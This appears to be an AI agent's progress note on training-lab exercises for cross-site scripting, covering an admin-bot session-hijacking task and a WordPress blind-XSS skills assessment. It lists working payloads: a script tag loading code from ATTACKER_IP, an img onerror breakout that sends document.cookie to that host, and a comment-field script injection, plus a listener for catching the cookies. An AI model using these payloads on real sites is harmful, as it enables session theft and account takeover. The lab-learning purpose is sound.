# Module 103 — Cross-Site Scripting (XSS)
## BLOCKED sections: Session Hijacking + Skills Assessment (blind XSS)

### Session Hijacking (`/hijacking/`)
Confirmed app layout on a fresh spawn:
- `/hijacking/` (a.k.a. `/hijacking/index.php`) — a **user registration** form, GET method, fields: `fullname`, `username`, `password`, `email`, `imgurl` (imgurl is optional/removed client-side if blank, strongly suggesting it's rendered inside an `<img src="...">` on the admin's review page).
- Submitting registration returns "Thank you for registering. An Admin will review your registration request." — confirms a **blind-XSS admin-bot review** flow (no separate bot-trigger endpoint exists; probed `bot.php`, `notify.php`, `trigger.php`, `review.php`, `pending.php`, `requests.php`, `dashboard.php`, `approve.php` — all 404).
- `/hijacking/login.php` — Admin Login form (`username`/`password`, POST). No creds known/brute-forceable; this is where the admin bot itself authenticates, then presumably views pending registrations on the same session (no other admin path exists — only `index.php` and `login.php` respond under `/hijacking/`).

**Working technique set up (verify from a Pwnbox/attacker box that's actually reachable by the target's VPN — our shared container's tun0 IP, e.g. `10.10.15.11`):**
1. Start a listener: `python3 -m http.server 8000` (logs full request line + query string — enough to capture an exfiltrated cookie).
2. Register with a payload in one/both of:
   - `fullname` = `<script src="http://ATTACKER_IP:8000/full.js"></script>`
   - `imgurl` = `x" onerror="fetch(`http://ATTACKER_IP:8000/c?d=`+document.cookie)" x="`  (breaks out of an `<img src="...">` attribute — this is the most likely real sink given the field name/behavior).
3. Poll the listener log for a GET request carrying the admin's cookie. **Requires a sustained ~2-5 minute window holding the same target** — the admin bot is not instant.

**Why this is still blocked, not a technique problem:** the account's single target slot was repeatedly stolen mid-wait by other concurrent agents working other modules — confirmed directly: after spawning `10.129.187.139` for this module and registering the payload above, the module page's Target(s) panel flipped to a *different* box (`10.129.172.255` / `ACADEMY-MISC-MS02`, which belongs to a different module e.g. File Transfers) within ~90 seconds, before the admin bot could have fired. The target slot appears to be **shared/global across whatever session spawns last**, not private per module tab.

**To finish:** re-run steps 1-3 above in a window where no other agent is actively spawning targets (e.g. sequentially, after other modules are done), and just wait out the bot — the injection point and listener technique above are believed correct and ready to go.

### Skills Assessment — WordPress 5.7.2 "Security Blog" (`/assessment/`)
Hint: "You can't see me, but i can see you!" → confirms blind-XSS intent.
Comment form fields: `author`, `email`, `url`, `comment` (POSTs to `wp-comments-post.php`).
Not re-attempted this session (target contention consumed the available window on Session Hijacking above). Prior session tried 8 payload placements (script in comment body, external script-src in author, attribute breakout in url, combined img-onerror+script) with no callback — but that was likely subject to the same contention/insufficient-dwell-time issue rather than a filter blocking every variant.

**Recommendation:** use the SAME listener technique (python3 http.server, or ATTACKER_IP:8000) and pick ONE clean payload in the `url` field (`http://ATTACKER_IP:8000"><script src="http://ATTACKER_IP:8000/x.js"></script>`), submit once, then hold the target and wait 2-5 minutes uninterrupted for the WP admin/reviewer bot.
